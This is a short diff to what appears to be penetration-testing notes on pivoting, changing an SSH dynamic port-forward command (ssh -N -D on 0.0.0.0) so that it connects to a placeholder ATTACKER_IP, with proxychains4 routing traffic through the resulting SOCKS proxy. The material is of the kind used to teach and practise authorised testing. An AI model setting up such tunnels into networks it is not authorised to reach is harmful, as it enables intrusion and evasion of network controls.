@@ -19,7 +19,7 @@ we can use `proxychains4` with OpenSSH's dynamic port forward option.
 With the following, OpenSSH opens a SOCKS proxy server:
 
 ```
-ssh -N -D 0.0.0.0:${OWNED_PORT0} ${USER}@${OWNED_IP1}
+ssh -N -D 0.0.0.0:${OWNED_PORT0} ${USER}@${ATTACKER_IP}
 ```
 
 To make sure packages are sent in a compatible manner, we use `proxychains4`.
